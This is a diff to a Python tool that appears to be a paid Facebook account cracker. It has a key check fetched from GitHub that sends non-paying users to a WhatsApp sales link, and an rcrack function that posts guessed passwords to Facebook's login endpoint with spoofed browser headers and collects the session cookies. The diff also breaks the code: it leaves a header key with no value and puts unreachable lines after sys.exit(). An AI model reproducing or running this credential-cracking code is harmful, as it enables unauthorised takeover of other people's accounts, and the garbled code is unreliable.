@@ -132,16 +132,16 @@ def main_apv():
   try: 
     httpCaht = requests.get("https://raw.githubusercontent.com/XD-MUGHAL00/system/main/Approval.txt").text 
     if id in httpCaht: 
-      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLS˜˜........\033[97m")
-      msg = str(os.geteuid()) 
-      time.sleep(3) 
       pass 
     else: 
       print("\033[0;96m YOUR key IS NOT ACTIVE\n THIS TOOL IS PAID\n IF YOU BUY MY TOOL\n SO YOUR KEY COPY AND SEND ME MESSAGE ON WHATSAPP  ") 
-      os.system('xdg-open https://wa.me/+923239021979?text=*Hello*%2C%20*MGL*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*Random*%20*clone*')
+      os.system('xdg-open https://wa.me/+923239021979?text=Hello%2C%20MUGHAL%20I%20want%20to%20buy%20your%20command%20Random%20clone')
       time.sleep(3) 
       sys.exit() 
-  except: 
+      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLS˜˜........\033[97m")
+      msg = str(os.geteuid()) 
+      time.sleep(3) 
+  except:
     sys.exit() 
     if name == '__main__': 
      print (logo)
@@ -249,21 +249,7 @@ def rcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {
-			'authority': 'www.facebook.com',
-			'method': 'GET',
-			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://www.facebook.com/',
-			'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Windows"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
+			'authority':
 			'user-agent': pro,}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
